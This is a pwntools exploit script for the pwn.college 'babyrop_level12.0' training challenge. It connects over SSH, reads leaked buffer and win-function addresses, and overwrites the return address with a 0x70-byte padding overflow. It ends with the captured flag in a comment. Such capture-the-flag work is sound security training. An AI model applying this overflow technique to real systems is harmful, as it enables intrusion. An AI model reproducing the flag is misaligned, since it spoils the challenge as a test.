from pwn import *

elf = context.binary = ELF("./babyrop_level12.0")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")

io = s.process("/challenge/babyrop_level12.0")

io.recvuntil(b'[LEAK] Your input buffer is located at: ')
buf = int(io.recvline().strip()[:-1], 16)

io.recvuntil(b'The win function has just been dynamically constructed at ')
win = int(io.recvline().strip()[:-1], 16)

io.send(b'a'*0x70 + p64(win))
io.interactive()
# Flag: pwn.college{gvITmm5EP8JgORll3maDoie2Jw-.01M2MDLxIjNyEzW}